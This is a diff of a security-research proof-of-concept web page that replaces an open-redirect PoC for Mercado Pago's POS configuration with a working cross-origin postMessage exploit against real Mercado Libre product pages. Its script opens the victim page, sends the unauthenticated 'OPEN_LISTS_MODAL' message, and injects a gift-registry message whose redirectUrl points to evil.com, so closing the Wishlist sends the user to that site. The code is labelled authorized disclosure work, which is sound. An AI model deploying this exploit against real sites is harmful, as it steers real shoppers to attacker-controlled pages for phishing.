@@ -3,126 +3,291 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <!-- Forces the full attacker URL to be exposed as document.referrer on the
-         target page, even on a cross-origin navigation. Required for the PoC. -->
-    <meta name="referrer" content="unsafe-url">
-    <title>Open-redirect PoC — Mercado Pago POS configuration</title>
+    <meta name="color-scheme" content="dark">
+    <title>CORE-021 — Cross-Origin postMessage PoC</title>
     <style>
       :root {
-        --bg: #0f1220; --card: #171b2e; --line: #262c47; --ink: #e8ebf5;
-        --muted: #9aa3c4; --accent: #3483fa; --danger: #ff5a6a; --ok: #2fd07f;
-        --mono: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+        --bg: #070a13;
+        --panel: rgba(17, 24, 39, .86);
+        --panel-2: rgba(10, 15, 28, .92);
+        --line: rgba(148, 163, 184, .2);
+        --text: #f8fafc;
+        --muted: #9ca3af;
+        --yellow: #ffe600;
+        --blue: #3483fa;
+        --green: #34d399;
+        --red: #fb7185;
       }
+
       * { box-sizing: border-box; }
+
       body {
-        margin: 0; min-height: 100vh; color: var(--ink);
-        font: 16px/1.6 system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
-        background: radial-gradient(1200px 600px at 50% -10%, #1b2143 0%, var(--bg) 60%);
-        display: flex; align-items: center; justify-content: center; padding: 2.5rem 1rem;
+        margin: 0;
+        min-height: 100vh;
+        color: var(--text);
+        background:
+          radial-gradient(circle at 15% 10%, rgba(52, 131, 250, .18), transparent 32rem),
+          radial-gradient(circle at 85% 90%, rgba(255, 230, 0, .09), transparent 28rem),
+          var(--bg);
+        font: 16px/1.55 Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       }
-      .wrap { width: 100%; max-width: 620px; }
-      .pill {
-        display: inline-flex; align-items: center; gap: .5rem;
-        background: rgba(255,90,106,.12); color: var(--danger);
-        border: 1px solid rgba(255,90,106,.35); border-radius: 999px;
-        padding: .35rem .8rem; font-size: .82rem; font-weight: 600; letter-spacing: .2px;
+
+      .shell { width: min(980px, calc(100% - 32px)); margin: 0 auto; padding: 52px 0 72px; }
+
+      .eyebrow {
+        display: inline-flex;
+        gap: 9px;
+        align-items: center;
+        padding: 7px 11px;
+        border: 1px solid rgba(52, 211, 153, .3);
+        border-radius: 999px;
+        color: #a7f3d0;
+        background: rgba(6, 78, 59, .18);
+        font-size: 12px;
+        font-weight: 800;
+        letter-spacing: .08em;
+        text-transform: uppercase;
       }
-      .pill .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger);
-        box-shadow: 0 0 0 4px rgba(255,90,106,.18); }
-      .card {
-        margin-top: 1rem; background: var(--card); border: 1px solid var(--line);
-        border-radius: 16px; padding: 1.6rem 1.6rem 1.4rem; box-shadow: 0 24px 60px rgba(0,0,0,.4);
-      }
-      h1 { font-size: 1.25rem; margin: .2rem 0 .3rem; line-height: 1.3; }
-      .sub { color: var(--muted); font-size: .92rem; margin: 0 0 1.3rem; }
-      code { font-family: var(--mono); background: rgba(255,255,255,.06); padding: .1rem .35rem; border-radius: 6px; font-size: .85em; }
-      label { display: block; font-size: .82rem; color: var(--muted); margin-bottom: .35rem; }
+
+      .pulse { width: 8px; height: 8px; border-radius: 50%; background: var(--green); box-shadow: 0 0 18px var(--green); }
+      h1 { max-width: 800px; margin: 22px 0 12px; font-size: clamp(34px, 6vw, 64px); line-height: 1.02; letter-spacing: -.045em; }
+      .lead { max-width: 760px; margin: 0 0 34px; color: #cbd5e1; font-size: 18px; }
+      .highlight { color: var(--yellow); }
+
+      .grid { display: grid; grid-template-columns: minmax(0, 1.35fr) minmax(280px, .65fr); gap: 18px; }
+      .card { border: 1px solid var(--line); border-radius: 20px; background: var(--panel); box-shadow: 0 20px 60px rgba(0, 0, 0, .28); backdrop-filter: blur(16px); }
+      .main-card { padding: 24px; }
+      .side-card { padding: 22px; background: var(--panel-2); }
+
+      label { display: block; margin: 0 0 7px; color: #e5e7eb; font-size: 13px; font-weight: 800; }
+      .field + .field { margin-top: 16px; }
       input {
-        width: 100%; padding: .7rem .85rem; border-radius: 10px; color: var(--ink);
-        background: #10132340; border: 1px solid var(--line); font: inherit; font-family: var(--mono);
+        width: 100%;
+        min-height: 48px;
+        padding: 11px 13px;
+        border: 1px solid rgba(148, 163, 184, .26);
+        border-radius: 12px;
+        outline: none;
+        color: var(--text);
+        background: rgba(2, 6, 23, .72);
+        font: 14px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
       }
-      input:focus { outline: none; border-color: var(--accent); }
-      .btn {
-        display: inline-block; margin-top: 1rem; width: 100%; text-align: center;
-        padding: .85rem 1rem; border-radius: 11px; background: var(--accent); color: #fff;
-        text-decoration: none; font-weight: 600; transition: filter .15s;
+      input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(52, 131, 250, .15); }
+      input[readonly] { color: #a7f3d0; }
+
+      .steps { display: grid; gap: 11px; margin-top: 22px; }
+      button {
+        display: grid;
+        grid-template-columns: 34px 1fr auto;
+        gap: 12px;
+        align-items: center;
+        width: 100%;
+        min-height: 60px;
+        padding: 10px 14px;
+        border: 1px solid rgba(148, 163, 184, .2);
+        border-radius: 14px;
+        color: var(--text);
+        background: rgba(30, 41, 59, .68);
+        text-align: left;
+        cursor: pointer;
+        transition: transform .15s ease, border-color .15s ease, background .15s ease;
       }
-      .btn:hover { filter: brightness(1.08); }
-      ol { margin: 1.4rem 0 0; padding-left: 1.2rem; color: var(--muted); font-size: .92rem; }
-      ol li { margin: .45rem 0; }
-      ol li strong { color: var(--ink); }
-      .landed {
-        margin-bottom: 1.1rem; border: 1px solid rgba(47,208,127,.4);
-        background: rgba(47,208,127,.1); border-radius: 12px; padding: 1rem 1.1rem;
+      button:hover:not(:disabled) { transform: translateY(-1px); border-color: rgba(52, 131, 250, .72); background: rgba(30, 58, 138, .34); }
+      button:disabled { cursor: not-allowed; opacity: .42; }
+      .number { display: grid; place-items: center; width: 32px; height: 32px; border-radius: 10px; color: #111827; background: var(--yellow); font-weight: 900; }
+      .button-title { display: block; font-weight: 850; }
+      .button-note { display: block; margin-top: 2px; color: var(--muted); font-size: 12px; }
+      .arrow { color: #64748b; font-size: 20px; }
+
+      .status {
+        margin-top: 18px;
+        padding: 14px 15px;
+        border: 1px solid rgba(52, 131, 250, .24);
+        border-radius: 13px;
+        color: #bfdbfe;
+        background: rgba(30, 64, 175, .14);
       }
-      .landed .t { color: var(--ok); font-weight: 700; display: flex; align-items: center; gap: .5rem; }
-      .landed .r { font-family: var(--mono); font-size: .82rem; color: var(--ink);
-        margin-top: .55rem; word-break: break-all; background: rgba(0,0,0,.25); padding: .55rem .7rem; border-radius: 8px; }
-      .foot { color: var(--muted); font-size: .78rem; margin-top: 1.1rem; text-align: center; }
-      .origin { font-family: var(--mono); }
+      .status strong { color: white; }
+
+      h2 { margin: 0 0 13px; font-size: 16px; }
+      .origin { overflow-wrap: anywhere; color: #93c5fd; font: 13px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+      .checklist { margin: 20px 0 0; padding: 0; list-style: none; }
+      .checklist li { position: relative; margin: 12px 0; padding-left: 25px; color: #cbd5e1; font-size: 14px; }
+      .checklist li::before { content: "✓"; position: absolute; left: 0; color: var(--green); font-weight: 900; }
+      .warning { margin-top: 20px; padding: 13px; border: 1px solid rgba(251, 113, 133, .28); border-radius: 12px; color: #fecdd3; background: rgba(159, 18, 57, .12); font-size: 13px; }
+
+      .log-card { margin-top: 18px; padding: 18px; }
+      pre { min-height: 120px; margin: 0; overflow: auto; white-space: pre-wrap; color: #d1fae5; font: 13px/1.55 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+      .footer { margin-top: 20px; color: #64748b; font-size: 12px; text-align: center; }
+
+      @media (max-width: 780px) {
+        .shell { padding-top: 30px; }
+        .grid { grid-template-columns: 1fr; }
+        .main-card, .side-card { padding: 18px; }
+      }
     </style>
   </head>
   <body>
-    <div class="wrap">
-      <span class="pill"><span class="dot"></span> Attacker-controlled origin · <span id="origin" class="origin"></span></span>
+    <main class="shell">
+      <span class="eyebrow"><span class="pulse"></span> Authorized security research PoC</span>
+      <h1>Cross-origin <span class="highlight">postMessage</span> redirect</h1>
+      <p class="lead">This page demonstrates that an unrelated origin can open a genuine mobile Mercado Libre product page, activate its Wishlist UI, inject an external destination, and cause navigation when the sheet is closed.</p>
 
-      <div class="card">
-        <div id="landing"></div>
+      <section class="grid">
+        <div class="card main-card">
+          <div class="field">
+            <label for="target">Victim product page</label>
+            <input id="target" value="https://www.mercadolibre.com.ar/el-portugues-nueces-mariposas-extra-light-x-1kg/p/MLA25811881/">
+          </div>
 
-        <h1>Open redirect in Mercado Pago POS configuration</h1>
-        <p class="sub">After clicking <strong>Guardar</strong>, the page runs
-          <code>document.location = document.referrer</code> with no validation, so
-          it sends the authenticated user back to this attacker origin.</p>
+          <div class="field">
+            <label for="destination">Attacker-controlled redirect destination</label>
+            <input id="destination" value="http://evil.com/">
+          </div>
 
-        <label for="pos">Victim's own POS ID</label>
-        <input id="pos" inputmode="numeric" placeholder="135014700" value="135014700">
-        <a id="open" class="btn" href="#">Open Mercado Pago POS configuration →</a>
+          <div class="steps">
+            <button id="open">
+              <span class="number">1</span>
+              <span><span class="button-title">Open Mercado Libre</span><span class="button-note">Opens the genuine mobile product page in a new window</span></span>
+              <span class="arrow">→</span>
+            </button>
 
-        <ol>
-          <li>Open this page while logged in to the Mercado Pago account that owns the POS.</li>
-          <li>Click the button — you land on the real
-            <code>www.mercadopago.com.ar</code> configuration page.</li>
-          <li>Click the pencil next to the POS name, type a character and delete it
-            (no data changes), then click <strong>Guardar</strong>.</li>
-          <li>Mercado Pago redirects the browser back to <strong>this origin</strong>.</li>
-        </ol>
-      </div>
-      <p class="foot">CWE-601 · document.referrer open redirect · CORE-015</p>
-    </div>
+            <button id="wishlist" disabled>
+              <span class="number">2</span>
+              <span><span class="button-title">Open Wishlist through postMessage</span><span class="button-note">Sends the unauthenticated OPEN_LISTS_MODAL message</span></span>
+              <span class="arrow">→</span>
+            </button>
+
+            <button id="inject" disabled>
+              <span class="number">3</span>
+              <span><span class="button-title">Arm the external redirect</span><span class="button-note">Injects evil.com as the Wishlist close destination</span></span>
+              <span class="arrow">→</span>
+            </button>
+
+            <button id="focus" disabled>
+              <span class="number">4</span>
+              <span><span class="button-title">Return to the victim window</span><span class="button-note">Close Wishlist with its normal X button to trigger navigation</span></span>
+              <span class="arrow">→</span>
+            </button>
+          </div>
+
+          <div class="status" id="status"><strong>Ready.</strong> Start with step 1 and wait for the product page to finish loading.</div>
+        </div>
+
+        <aside class="card side-card">
+          <h2>Attacker origin</h2>
+          <div class="origin" id="origin"></div>
+
+          <ul class="checklist">
+            <li>Use a mobile User-Agent before loading either page.</li>
+            <li>Allow popups for this GitHub Pages origin.</li>
+            <li>Use only your own Mercado Libre test session.</li>
+            <li>Do not select a list or change any favorite.</li>
+            <li>After step 3, close the Wishlist sheet normally.</li>
+          </ul>
+
+          <div class="warning">Run the messages from this attacker page. Pasting them into Mercado Libre DevTools would not demonstrate the cross-origin issue.</div>
+        </aside>
+      </section>
+
+      <section class="card log-card">
+        <h2>PoC event log</h2>
+        <pre id="log">No messages sent yet.</pre>
+      </section>
+
+      <p class="footer">CORE-021 · CWE-346 / CWE-601 · Non-destructive proof of concept</p>
+    </main>
 
     <script>
-      (function () {
-        var origin = window.location.origin;
-        document.getElementById('origin').textContent = origin;
+      let victim = null;
+      const status = document.querySelector('#status');
+      const log = document.querySelector('#log');
+      const wishlistButton = document.querySelector('#wishlist');
+      const injectButton = document.querySelector('#inject');
+      const focusButton = document.querySelector('#focus');
 
-        // Landing state: arrived here FROM mercadopago after Save.
-        if (document.referrer.indexOf('mercadopago.com.ar') !== -1) {
-          document.getElementById('landing').innerHTML =
-            '<div class="landed"><div class="t">✓ Redirect landed — Mercado Pago sent the ' +
-            'authenticated victim to the attacker origin after Save.</div>' +
-            '<div class="r">document.referrer = ' + document.referrer + '</div></div>';
+      document.querySelector('#origin').textContent = location.origin;
+
+      function victimAvailable() {
+        return victim && !victim.closed;
+      }
+
+      function setStatus(title, detail) {
+        status.innerHTML = '';
+        const strong = document.createElement('strong');
+        strong.textContent = title;
+        status.append(strong, document.createTextNode(' ' + detail));
+      }
+
+      document.querySelector('#open').addEventListener('click', () => {
+        const target = document.querySelector('#target').value.trim();
+        victim = window.open(target, 'core021-victim');
+
+        if (!victim) {
+          setStatus('Popup blocked.', 'Allow popups for this site and repeat step 1.');
+          return;
         }
 
-        var params = new URLSearchParams(location.search);
-        var input = document.getElementById('pos');
-        var link = document.getElementById('open');
-        if (params.get('pos')) input.value = params.get('pos');
-        function update() {
-          var id = input.value.trim();
-          link.href = /^\d+$/.test(id)
-            ? 'https://www.mercadopago.com.ar/collections/setup/pos/' + id
-            : '#';
+        wishlistButton.disabled = false;
+        injectButton.disabled = true;
+        focusButton.disabled = false;
+        log.textContent = [
+          '[1] Victim window opened by attacker origin',
+          'attacker origin: ' + location.origin,
+          'victim URL: ' + target,
+          'WindowProxy retained: true'
+        ].join('\n');
+        setStatus('Victim opened.', 'Wait for the product page to load completely, then return here for step 2.');
+      });
+
+      wishlistButton.addEventListener('click', () => {
+        if (!victimAvailable()) {
+          setStatus('Victim unavailable.', 'Repeat step 1 to obtain a new window reference.');
+          return;
         }
-        input.addEventListener('input', update);
-        link.addEventListener('click', function (e) {
-          update();
-          if (link.getAttribute('href') === '#') {
-            e.preventDefault();
-            alert('Enter the numeric ID of a POS owned by your test account.');
+
+        victim.postMessage('OPEN_LISTS_MODAL', '*');
+        injectButton.disabled = false;
+        victim.focus();
+        log.textContent += [
+          '',
+          '[2] Cross-origin message sent',
+          "victim.postMessage('OPEN_LISTS_MODAL', '*');"
+        ].join('\n');
+        setStatus('Wishlist message sent.', 'Confirm that the genuine Wishlist sheet appeared, then return here for step 3.');
+      });
+
+      injectButton.addEventListener('click', () => {
+        const redirectUrl = document.querySelector('#destination').value.trim();
+
+        if (!victimAvailable()) {
+          setStatus('Victim unavailable.', 'Repeat step 1 to obtain a new window reference.');
+          return;
+        }
+
+        const message = {
+          method: 'giftRegistry:celebration-date:set-current-step',
+          args: {
+            stepName: 'celebrationDate',
+            redirectUrl
           }
-        });
-        update();
-      })();
+        };
+
+        victim.postMessage(message, '*');
+        victim.focus();
+        log.textContent += [
+          '',
+          '[3] External redirect destination injected',
+          JSON.stringify(message, null, 2),
+          '',
+          '[4] Close the Wishlist sheet in the victim window.'
+        ].join('\n');
+        setStatus('Redirect armed.', 'Close Wishlist with its normal X button. The genuine window should navigate to ' + redirectUrl);
+      });
+
+      focusButton.addEventListener('click', () => {
+        if (victimAvailable()) victim.focus();
+      });
     </script>
   </body>
 </html>
